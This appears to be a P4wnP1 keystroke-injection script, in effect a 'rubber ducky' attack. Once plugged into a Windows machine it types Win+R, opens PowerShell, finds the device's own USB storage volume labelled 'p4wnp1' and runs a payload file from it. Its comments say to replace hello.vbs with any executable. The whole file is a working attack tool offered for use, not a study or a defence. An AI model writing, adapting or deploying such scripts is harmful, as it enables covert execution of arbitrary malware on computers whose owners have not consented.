// run any payload like .exe .vbs and more
// make a new UMS on P4wnP1 6:55 https://www.youtube.com/watch?v=I_BjCdJlCo4 
// put your payload on the UMS of P4wnP1 
// replace hello.vbs by yourpayloadname.exe line 27

layout('de') // set layout keyboard DE

press("GUI r") // win + r
delay(200)
type("powershell\n") // powershell.exe + enter
delay(500)
type("$usbPath = Get-WMIObject Win32_Volume ")

press("RIGHT_ALT 6") // pipeline


type(" ? { $_.Label -eq 'p4wnp1' } ") // "p4wnp1" = name UMS

press("RIGHT_ALT 6") // pipeline

type("select name \n")
type("cd $usbpath.name\n") // cd UMS of P4wnP1
type("./hello.vbs\n") // run
type("exit\n")
